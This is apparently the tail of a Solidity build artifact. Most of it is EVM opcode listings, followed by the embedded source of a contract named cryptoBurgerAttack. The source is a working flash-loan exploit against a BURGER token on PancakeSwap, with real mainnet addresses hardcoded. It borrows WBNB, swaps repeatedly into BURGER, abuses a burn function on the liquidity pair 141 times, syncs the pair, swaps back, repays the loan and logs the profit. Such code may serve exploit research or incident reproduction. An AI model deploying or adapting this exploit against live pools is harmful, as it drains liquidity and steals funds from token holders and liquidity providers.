    "11920": {
      "op": "POP"
    },
    "11921": {
      "op": "DIV"
    },
    "11922": {
      "op": "SWAP1"
    },
    "11923": {
      "jump": "o",
      "op": "JUMP"
    },
    "11924": {
      "op": "JUMPDEST"
    },
    "11925": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11927": {
      "op": "DUP3"
    },
    "11928": {
      "op": "NOT"
    },
    "11929": {
      "op": "DUP3"
    },
    "11930": {
      "op": "GT"
    },
    "11931": {
      "op": "ISZERO"
    },
    "11932": {
      "op": "PUSH2",
      "value": "0x2EA7"
    },
    "11935": {
      "op": "JUMPI"
    },
    "11936": {
      "op": "PUSH2",
      "value": "0x2EA7"
    },
    "11939": {
      "op": "PUSH2",
      "value": "0x2E24"
    },
    "11942": {
      "jump": "i",
      "op": "JUMP"
    },
    "11943": {
      "op": "JUMPDEST"
    },
    "11944": {
      "op": "POP"
    },
    "11945": {
      "op": "ADD"
    },
    "11946": {
      "op": "SWAP1"
    },
    "11947": {
      "jump": "o",
      "op": "JUMP"
    },
    "11948": {
      "op": "JUMPDEST"
    },
    "11949": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11951": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "11953": {
      "op": "DUP3"
    },
    "11954": {
      "op": "DUP5"
    },
    "11955": {
      "op": "SUB"
    },
    "11956": {
      "op": "SLT"
    },
    "11957": {
      "op": "ISZERO"
    },
    "11958": {
      "op": "PUSH2",
      "value": "0x2EBE"
    },
    "11961": {
      "op": "JUMPI"
    },
    "11962": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11964": {
      "op": "DUP1"
    },
    "11965": {
      "op": "REVERT"
    },
    "11966": {
      "op": "JUMPDEST"
    },
    "11967": {
      "op": "DUP2"
    },
    "11968": {
      "op": "MLOAD"
    },
    "11969": {
      "op": "DUP1"
    },
    "11970": {
      "op": "ISZERO"
    },
    "11971": {
      "op": "ISZERO"
    },
    "11972": {
      "op": "DUP2"
    },
    "11973": {
      "op": "EQ"
    },
    "11974": {
      "op": "PUSH2",
      "value": "0x2C76"
    },
    "11977": {
      "op": "JUMPI"
    },
    "11978": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11980": {
      "op": "DUP1"
    },
    "11981": {
      "op": "REVERT"
    },
    "11982": {
      "op": "JUMPDEST"
    },
    "11983": {
      "op": "DUP5"
    },
    "11984": {
      "op": "DUP2"
    },
    "11985": {
      "op": "MSTORE"
    },
    "11986": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "11988": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "11990": {
      "op": "DUP6"
    },
    "11991": {
      "op": "DUP2"
    },
    "11992": {
      "op": "DUP5"
    },
    "11993": {
      "op": "ADD"
    },
    "11994": {
      "op": "MSTORE"
    },
    "11995": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "11997": {
      "op": "DUP1"
    },
    "11998": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "12000": {
      "op": "SHL"
    },
    "12001": {
      "op": "SUB"
    },
    "12002": {
      "op": "DUP6"
    },
    "12003": {
      "op": "AND"
    },
    "12004": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "12006": {
      "op": "DUP5"
    },
    "12007": {
      "op": "ADD"
    },
    "12008": {
      "op": "MSTORE"
    },
    "12009": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "12011": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "12013": {
      "op": "DUP5"
    },
    "12014": {
      "op": "ADD"
    },
    "12015": {
      "op": "MSTORE"
    },
    "12016": {
      "op": "DUP4"
    },
    "12017": {
      "op": "MLOAD"
    },
    "12018": {
      "op": "DUP1"
    },
    "12019": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "12021": {
      "op": "DUP6"
    },
    "12022": {
      "op": "ADD"
    },
    "12023": {
      "op": "MSTORE"
    },
    "12024": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "12026": {
      "op": "JUMPDEST"
    },
    "12027": {
      "op": "DUP2"
    },
    "12028": {
      "op": "DUP2"
    },
    "12029": {
      "op": "LT"
    },
    "12030": {
      "op": "ISZERO"
    },
    "12031": {
      "op": "PUSH2",
      "value": "0x2F16"
    },
    "12034": {
      "op": "JUMPI"
    },
    "12035": {
      "op": "DUP6"
    },
    "12036": {
      "op": "DUP2"
    },
    "12037": {
      "op": "ADD"
    },
    "12038": {
      "op": "DUP4"
    },
    "12039": {
      "op": "ADD"
    },
    "12040": {
      "op": "MLOAD"
    },
    "12041": {
      "op": "DUP6"
    },
    "12042": {
      "op": "DUP3"
    },
    "12043": {
      "op": "ADD"
    },
    "12044": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "12046": {
      "op": "ADD"
    },
    "12047": {
      "op": "MSTORE"
    },
    "12048": {
      "op": "DUP3"
    },
    "12049": {
      "op": "ADD"
    },
    "12050": {
      "op": "PUSH2",
      "value": "0x2EFA"
    },
    "12053": {
      "op": "JUMP"
    },
    "12054": {
      "op": "JUMPDEST"
    },
    "12055": {
      "op": "DUP2"
    },
    "12056": {
      "op": "DUP2"
    },
    "12057": {
      "op": "GT"
    },
    "12058": {
      "op": "ISZERO"
    },
    "12059": {
      "op": "PUSH2",
      "value": "0x2F28"
    },
    "12062": {
      "op": "JUMPI"
    },
    "12063": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "12065": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "12067": {
      "op": "DUP4"
    },
    "12068": {
      "op": "DUP8"
    },
    "12069": {
      "op": "ADD"
    },
    "12070": {
      "op": "ADD"
    },
    "12071": {
      "op": "MSTORE"
    },
    "12072": {
      "op": "JUMPDEST"
    },
    "12073": {
      "op": "POP"
    },
    "12074": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "12076": {
      "op": "ADD"
    },
    "12077": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "12079": {
      "op": "NOT"
    },
    "12080": {
      "op": "AND"
    },
    "12081": {
      "op": "SWAP3"
    },
    "12082": {
      "op": "SWAP1"
    },
    "12083": {
      "op": "SWAP3"
    },
    "12084": {
      "op": "ADD"
    },
    "12085": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "12087": {
      "op": "ADD"
    },
    "12088": {
      "op": "SWAP7"
    },
    "12089": {
      "op": "SWAP6"
    },
    "12090": {
      "op": "POP"
    },
    "12091": {
      "op": "POP"
    },
    "12092": {
      "op": "POP"
    },
    "12093": {
      "op": "POP"
    },
    "12094": {
      "op": "POP"
    },
    "12095": {
      "op": "POP"
    },
    "12096": {
      "jump": "o",
      "op": "JUMP"
    },
    "12097": {
      "op": "JUMPDEST"
    },
    "12098": {
      "op": "DUP6"
    },
    "12099": {
      "op": "DUP2"
    },
    "12100": {
      "op": "MSTORE"
    },
    "12101": {
      "op": "DUP5"
    },
    "12102": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "12104": {
      "op": "DUP3"
    },
    "12105": {
      "op": "ADD"
    },
    "12106": {
      "op": "MSTORE"
    },
    "12107": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "12109": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "12111": {
      "op": "DUP3"
    },
    "12112": {
      "op": "ADD"
    },
    "12113": {
      "op": "MSTORE"
    },
    "12114": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "12116": {
      "op": "PUSH2",
      "value": "0x2F60"
    },
    "12119": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "12121": {
      "op": "DUP4"
    },
    "12122": {
      "op": "ADD"
    },
    "12123": {
      "op": "DUP7"
    },
    "12124": {
      "op": "PUSH2",
      "value": "0x2CA9"
    },
    "12127": {
      "jump": "i",
      "op": "JUMP"
    },
    "12128": {
      "op": "JUMPDEST"
    },
    "12129": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "12131": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "12133": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "12135": {
      "op": "SHL"
    },
    "12136": {
      "op": "SUB"
    },
    "12137": {
      "op": "SWAP5"
    },
    "12138": {
      "op": "SWAP1"
    },
    "12139": {
      "op": "SWAP5"
    },
    "12140": {
      "op": "AND"
    },
    "12141": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "12143": {
      "op": "DUP4"
    },
    "12144": {
      "op": "ADD"
    },
    "12145": {
      "op": "MSTORE"
    },
    "12146": {
      "op": "POP"
    },
    "12147": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "12149": {
      "op": "ADD"
    },
    "12150": {
      "op": "MSTORE"
    },
    "12151": {
      "op": "SWAP4"
    },
    "12152": {
      "op": "SWAP3"
    },
    "12153": {
      "op": "POP"
    },
    "12154": {
      "op": "POP"
    },
    "12155": {
      "op": "POP"
    },
    "12156": {
      "jump": "o",
      "op": "JUMP"
    }
  },
  "sha1": "ae55eecb3630ea3372c475dec36af7c1c71d9745",
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../interfaces/IERC20.sol\";\nimport \"../interfaces/sushiswap.sol\";\n\ninterface IPancakeCallee {\n    function pancakeCall(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n}\n\ninterface IWBNB is IERC20 {\n    function deposit() external payable;\n\n    function withdraw(uint256) external;\n}\n\ncontract cryptoBurgerAttack is IPancakeCallee {\n    address private constant PANCAKE_SWAP_ROUTER =\n        0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private constant PANCAKE_SWAP_FACTORY =\n        0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;\n\n    address private constant PANCAKE_SWAP_PAIR =\n        0x02b0551B656509754285eeC81eE894338E14C5DD;\n\n    address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\n\n    address private constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;\n\n    address private constant BURGER =\n        0xF40d33DE6737367A1cCB0cE6a056698D993A17E1;\n\n    IERC20 WBNB_interface = IERC20(WBNB);\n    IERC20 BURGER_interface = IERC20(BURGER);\n\n    event LOG(string message, uint256 amount);\n    event LOGAdd(string message, address amount);\n\n    function flashLoan(address _tokenBorrow, uint256 _amount) public {\n        address pair = IPancakeFactory(PANCAKE_SWAP_FACTORY).getPair(\n            _tokenBorrow,\n            USDC\n        );\n\n        // Check if pair exists\n        require(pair != address(0), \"Pair doesn't exists!\");\n\n        address token0 = IPancakePair(pair).token0();\n        address token1 = IPancakePair(pair).token1();\n        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;\n        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;\n\n        IPancakePair(pair).swap(\n            amount0Out,\n            amount1Out,\n            address(this),\n            abi.encode(_tokenBorrow, _amount)\n        );\n    }\n\n    function pancakeCall(\n        address _sender,\n        uint256 _amount0,\n        uint256 _amount1,\n        bytes calldata _data\n    ) external override {\n        address token0 = IPancakePair(msg.sender).token0();\n        address token1 = IPancakePair(msg.sender).token1();\n\n        address pair = IPancakeFactory(PANCAKE_SWAP_FACTORY).getPair(\n            token0,\n            token1\n        );\n\n        require(msg.sender == pair, \"Not a pair contract!\");\n        require(_sender == address(this), \"!sender\");\n\n        (address tokenBorrow, uint256 amount) = abi.decode(\n            _data,\n            (address, uint256)\n        );\n\n        // Current contract balance\n        emit LOG(\"Contract balance is\", address(this).balance);\n\n        // Insert swap logic\n        uint256 max_BURG_amount = 19999 * 1e18;\n\n        address[] memory path;\n        path = new address[](2);\n\n        path[0] = WBNB;\n        path[1] = BURGER;\n\n        uint256[] memory howMuchIneed;\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n\n        emit LOG(\n            \"WBNB balance of contract after receivving flashloan\",\n            WBNB_interface.balanceOf(address(this))\n        );\n\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token\",\n            howMuchIneed[0]\n        );\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 1st swap: \",\n            howMuchIneed[0]\n        );\n\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 2nd swap: \",\n            howMuchIneed[0]\n        );\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 3rd swap: \",\n            howMuchIneed[0]\n        );\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 4th swap: \",\n            howMuchIneed[0]\n        );\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 5th swap: \",\n            howMuchIneed[0]\n        );\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 6th swap: \",\n            howMuchIneed[0]\n        );\n\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 7th swap: \",\n            howMuchIneed[0]\n        );\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        emit LOG(\n            \"WBNB balance of contract\",\n            WBNB_interface.balanceOf(address(this))\n        );\n        emit LOG(\n            \"The required WBNB amount for 19M BURG token after 8th swap: \",\n            howMuchIneed[0]\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n        howMuchIneed = IPancakeRouter01(PANCAKE_SWAP_ROUTER).getAmountsIn(\n            max_BURG_amount,\n            path\n        );\n        swapIt(WBNB, BURGER, howMuchIneed[0], 0, payable(address(this)));\n\n        // Get current BURG supply\n        emit LOG(\n            \"WBNB Balance of contract after swaps...\",\n            WBNB_interface.balanceOf(address(this))\n        );\n\n        emit LOG(\"How much I need for another swap\", howMuchIneed[0]);\n\n        // Burn logic\n        for (uint256 i = 0; i < 141; i++) {\n            BURGER_interface.burn(PANCAKE_SWAP_PAIR, 19999 * 1e18);\n        }\n        emit LOG(\n            \"BURG balance of Package pair\",\n            BURGER_interface.balanceOf(PANCAKE_SWAP_PAIR)\n        );\n        IPancakePair(PANCAKE_SWAP_PAIR).sync();\n\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n        swapIt(BURGER, WBNB, 20000 * 1e18, 0, payable(address(this)));\n\n        swapIt(\n            BURGER,\n            WBNB,\n            BURGER_interface.balanceOf(address(this)),\n            0,\n            payable(address(this))\n        );\n\n        emit LOG(\n            \"BURG balance of contract after swap\",\n            BURGER_interface.balanceOf(address(this))\n        );\n\n        // Compute Repay Amount\n        uint256 fee = ((amount * 3) / 997) + 1;\n        uint256 amountToRepay = amount + fee;\n\n        IERC20(tokenBorrow).transfer(pair, amountToRepay);\n        emit LOG(\"Repay amount\", amountToRepay);\n\n        emit LOG(\n            \"Profit after repay: \",\n            WBNB_interface.balanceOf(address(this))\n        );\n        emit LOG(\"Total BURG supply \", BURGER_interface.totalSupply());\n    }\n\n    function swapIt(\n        address _tokenIn,\n        address _tokenOut,\n        uint256 amountIn, //\n        uint256 amountOut, // The amount of $BURG token to receive\n        address _to\n    ) internal {\n        IERC20(_tokenIn).approve(PANCAKE_SWAP_PAIR, amountIn);\n        IERC20(_tokenIn).approve(PANCAKE_SWAP_ROUTER, amountIn);\n\n        address[] memory path;\n        path = new address[](2);\n\n        path[0] = _tokenIn;\n        path[1] = _tokenOut;\n\n        IPancakeRouter01(PANCAKE_SWAP_ROUTER)\n            .swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                amountIn,\n                amountOut,\n                path,\n                _to,\n                block.timestamp\n            );\n    }\n\n    receive() external payable {}\n}\n",
  "sourceMap": "419:12437:0:-:0;;;1035:36;;;-1:-1:-1;;;;;;1035:36:0;;;814:42;1035:36;;;;;1077:40;;;;;986:42;1077:40;;;419:12437;;;;;;;;;;;;;;;;",
  "sourcePath": "contracts/burger_attack.sol",
  "type": "contract"
}